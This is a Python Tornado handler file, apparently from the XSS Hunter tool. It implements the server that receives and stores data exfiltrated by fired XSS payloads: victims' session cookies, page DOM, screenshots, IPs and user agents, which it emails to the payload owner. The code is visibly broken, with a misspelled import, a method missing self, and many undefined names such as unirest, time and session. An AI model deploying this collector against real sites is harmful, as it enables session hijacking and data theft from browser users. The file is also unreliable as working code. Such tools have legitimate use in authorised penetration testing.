
import json
import os
import urllib

from tornado.options import options

from handlers.base import BaseHandler
from models import DBSession
from models.injection_record import Injection
from modles.user import User


class XSSPayloadFiresHandler(BaseHandler):
    """
    Endpoint for querying for XSS payload fire data.

    By default returns past 25 payload fires

    Params:
        offset
        limit
    """
    def get(self):
        self.logit("User retrieved their injection results")
        user = self.get_authenticated_user()
        offset = abs(int(self.get_argument('offset', 0)))
        limit = abs(int(self.get_argument('limit', 25)))
        results = Injection.by_owner(user, limit, offset)
        total = len(user.injections)

        return_dict = {
            "results": [result.get_injection_blob() for result in results],
            "total": total,
            "success": True
        }
        self.write(return_dict)


class CallbackHandler(BaseHandler):
    """
    This is the handler that receives the XSS payload data upon it firing in
    someone's browser, it contains things such as session cookies, the page
    DOM, a screenshot of the page, etc.
    """

    def initialize(self):
        self.set_header('Access-Control-Allow-Origin', '*')
        self.set_header('Access-Control-Allow-Methods', 'POST, GET, HEAD, OPTIONS')
        self.set_header('Access-Control-Allow-Headers', 'X-Requested-With')

    def post(self):
        owner = User.by_domain()

        if owner is None:
            self.throw_404()
            return

        if "-----BEGIN PGP MESSAGE-----" in self.request.body:
            if owner.email_enabled:
                self.logit("User " + owner.username + " just got a PGP encrypted XSS callback, passing it along.")
                self.pgp_encrypted_callback_message(self.request.body, owner.email)
        else:
            callback_data = json.loads(self.request.body)
            callback_data['ip'] = self.request.remote_ip
            injection_db_record = self.record_callback_in_database( callback_data, self )
            self.logit( "User " + owner.username + " just got an XSS callback for URI " + injection_db_record.vulnerable_page )

            if owner.email_enabled:
                self.send_javascript_callback_message(owner.email, injection_db_record)
            self.write({})

    def send_email( to, subject, body, attachment_file, body_type="html" ):
        if body_type == "html":
            body += "<br /><img src=\"https://api." + options.domain + "/" + attachment_file.encode( "utf-8" ) + "\" />" # I'm so sorry.

        email_data = {
            "from": urllib.quote_plus(options.email_from),
            "to": urllib.quote_plus(to),
            "subject": urllib.quote_plus(subject),
            body_type: urllib.quote_plus(body),
        }

        thread = unirest.post( "https://api.mailgun.net/v3/" + options.mailgun_sending_domain + "/messages",
            headers={"Accept": "application/json"},
            params=email_data,
            auth=("api", settings["mailgun_api_key"] ),
            callback=email_sent_callback)


    def send_javascript_callback_message(self, email, injection_db_record):
        loader = tornado.template.Loader("templates/")

        injection_data = injection_db_record.get_injection_blob()

        email_html = loader.load("xss_email_template.htm").generate(injection_data=injection_data, domain=options.domain)
        return send_email(email, "[XSS Hunter] XSS Payload Fired On " + injection_data['vulnerable_page'], email_html, injection_db_record.screenshot )

    def pgp_encrypted_callback_message(self, email_data, email):
        return send_email( email, "[XSS Hunter] XSS Payload Message (PGP Encrypted)", email_data, False, "text" )

    def record_callback_in_database(self, callback_data, request_handler):
        screenshot_file_path = self.upload_screenshot(callback_data["screenshot"])

        injection = Injection(vulnerable_page=callback_data["uri"].encode("utf-8"),
            victim_ip=callback_data["ip"].encode("utf-8"),
            referer=callback_data["referrer"].encode("utf-8"),
            user_agent=callback_data["user-agent"].encode("utf-8"),
            cookies=callback_data["cookies"].encode("utf-8"),
            dom=callback_data["dom"].encode("utf-8"),
            origin=callback_data["origin"].encode("utf-8"),
            screenshot=screenshot_file_path.encode("utf-8"),
            injection_timestamp=int(time.time()),
            browser_time=int(callback_data["browser-time"])
        )
        injection.generate_injection_id()
        owner_user = request_handler.get_user_from_subdomain()
        injection.owner_id = owner_user.id

        # Check if this is correlated to someone's request.
        if callback_data["injection_key"] != "[PROBE_ID]":
            correlated_request_entry = session.query( InjectionRequest ).filter_by( injection_key=callback_data["injection_key"] ).filter_by( owner_correlation_key=owner_user.owner_correlation_key ).first()

            if correlated_request_entry != None:
                injection.correlated_request = correlated_request_entry.request
        else:
            injection.correlated_request = "Could not correlate XSS payload fire with request!"

        DBSession().add(injection)
        DBSession().commit()

        return injection

    def upload_screenshot(self, base64_screenshot_data_uri):
        screenshot_filename = "uploads/xsshunter_screenshot_" + os.urandom(100).encode('hex') + ".png"
        screenshot_file_handler = data_uri_to_file( base64_screenshot_data_uri )
        local_file_handler = open(screenshot_filename, "w")  # Async IO http://stackoverflow.com/a/13644499/1195812
        local_file_handler.write( screenshot_file_handler.read() )
        local_file_handler.close()
        return screenshot_filename
